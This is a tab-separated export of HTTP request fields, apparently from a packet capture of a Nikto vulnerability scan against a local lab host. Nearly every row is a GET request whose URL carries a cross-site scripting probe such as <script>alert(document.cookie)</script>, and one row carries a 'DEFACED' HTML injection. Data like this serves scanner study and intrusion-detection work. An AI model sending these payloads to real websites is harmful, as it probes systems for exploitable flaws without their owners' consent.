http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									3418						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003244)				/web/wp-login.php/sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3422						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003245)				/web/wp-login.php/sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3426						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003246)				/web/wp-login.php/sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3430						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003247)				/web/wp-login.php/sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3434						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003248)				/web/wp-login.php/sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3438						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003249)				/web/wp-login.php/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3442						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003250)				/web/wp-login.php/sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3446						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003251)				/web/wp-login.php/sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3450						1	http://192.168.1.101/web/wp-login.php/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003254)				/web/wp-login.php/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3454						1	http://192.168.1.101/web/wp-login.php/syshelp/stmex.stm?foo=<script>alert(document.cookie)</script>&bar=456		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003255)				/web/wp-login.php/syshelp/stmex.stm?foo=<script>alert(document.cookie)</script>&bar=456
																	Keep-Alive										192.168.1.101									3458						1	http://192.168.1.101/web/wp-login.php/syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003256)				/web/wp-login.php/syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3462						1	http://192.168.1.101/web/wp-login.php/syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003257)				/web/wp-login.php/syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3466						1	http://192.168.1.101/web/wp-login.php/syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003258)				/web/wp-login.php/syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3470						1	http://192.168.1.101/web/wp-login.php/netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003259)				/web/wp-login.php/netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3474						1	http://192.168.1.101/web/wp-login.php/netutils/findata.stm?host=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003260)				/web/wp-login.php/netutils/findata.stm?host=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3478						1	http://192.168.1.101/web/wp-login.php/netutils/findata.stm?user=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003261)				/web/wp-login.php/netutils/findata.stm?user=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3482						1	http://192.168.1.101/web/wp-login.php/sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003262)				/web/wp-login.php/sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									3486						1	http://192.168.1.101/web/wp-login.php/webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003274)				/web/wp-login.php/webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD
																	Keep-Alive										192.168.1.101									3490						1	http://192.168.1.101/web/wp-login.php/webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003276)				/web/wp-login.php/webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>
																	Keep-Alive										192.168.1.101									3494						1	http://192.168.1.101/web/wp-login.php/webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003277)				/web/wp-login.php/webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week
																	Keep-Alive										192.168.1.101									3498						1	http://192.168.1.101/web/wp-login.php/webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003280)				/web/wp-login.php/webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3502						1	http://192.168.1.101/web/wp-login.php/webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003281)				/web/wp-login.php/webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3506						1	http://192.168.1.101/web/wp-login.php/webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003284)				/web/wp-login.php/webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3510						1	http://192.168.1.101/web/wp-login.php/webtools/bonsai/showcheckins.cgi?person=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003286)				/web/wp-login.php/webtools/bonsai/showcheckins.cgi?person=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3514						1	http://192.168.1.101/web/wp-login.php/VpxElZA0wmMubmQRp8lMRlKUITCRGjfV6OAfvbFkwEllBEKwSL4RlNbBUHxxn7KkQNfc1sZW6qQWYkMemqvHv0HOFy95bUU3s4dly9hw1HRtxivFhlVVpFlQmT9yJMqMiqeqf3uNzoul7Yjjiyj3tOqAylIDbBGJEQQfuKDrjqJupAH973aiYM8YspdRVreThVHyEgY928bqGQoCot1wMK4T0HqK6Cu<font%20size=50>DEFACED<!--//--		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003288)				/web/wp-login.php/VpxElZA0wmMubmQRp8lMRlKUITCRGjfV6OAfvbFkwEllBEKwSL4RlNbBUHxxn7KkQNfc1sZW6qQWYkMemqvHv0HOFy95bUU3s4dly9hw1HRtxivFhlVVpFlQmT9yJMqMiqeqf3uNzoul7Yjjiyj3tOqAylIDbBGJEQQfuKDrjqJupAH973aiYM8YspdRVreThVHyEgY928bqGQoCot1wMK4T0HqK6Cu<font%20size=50>DEFACED<!--//--
																	Keep-Alive										192.168.1.101									3518						1	http://192.168.1.101/web/wp-login.php/M9Z80nCinutyFCAlnPREsChSXUqXrl5nvGvmQJyFvqNmROVIunPWWNyEUhk0yBmm9heVKRf4tihAeganwBPpssvBT9ZnnYNduuEKgwaLPrXvOtqOLaOvG3EsfGuR9Enicc3kueTilKppVBWfyzYnkGW2fdpOZ1QE7x1Kneak5R2AyiViLOZE2mbGi2peKHrlh2zIcXMgUY55QvqRfsgpBiuRcYPQlQS<font%20size=50><script>alert(11)</script><!--//--		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003323)				/web/wp-login.php/M9Z80nCinutyFCAlnPREsChSXUqXrl5nvGvmQJyFvqNmROVIunPWWNyEUhk0yBmm9heVKRf4tihAeganwBPpssvBT9ZnnYNduuEKgwaLPrXvOtqOLaOvG3EsfGuR9Enicc3kueTilKppVBWfyzYnkGW2fdpOZ1QE7x1Kneak5R2AyiViLOZE2mbGi2peKHrlh2zIcXMgUY55QvqRfsgpBiuRcYPQlQS<font%20size=50><script>alert(11)</script><!--//--
																	Keep-Alive										192.168.1.101									3522						1	http://192.168.1.101/web/wp-login.php/pls/dadname/htp.print?cbuf=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003355)				/web/wp-login.php/pls/dadname/htp.print?cbuf=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3526						1	http://192.168.1.101/web/wp-login.php/pls/help/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003356)				/web/wp-login.php/pls/help/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									3530						1	http://192.168.1.101/web/wp-login.php/shopadmin.asp?Password=abc&UserName=\"><script>alert(foo)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003410)				/web/wp-login.php/shopadmin.asp?Password=abc&UserName=\"><script>alert(foo)</script>
																	Keep-Alive										192.168.1.101									3534						1	http://192.168.1.101/web/wp-login.php/phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003411)				/web/wp-login.php/phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>
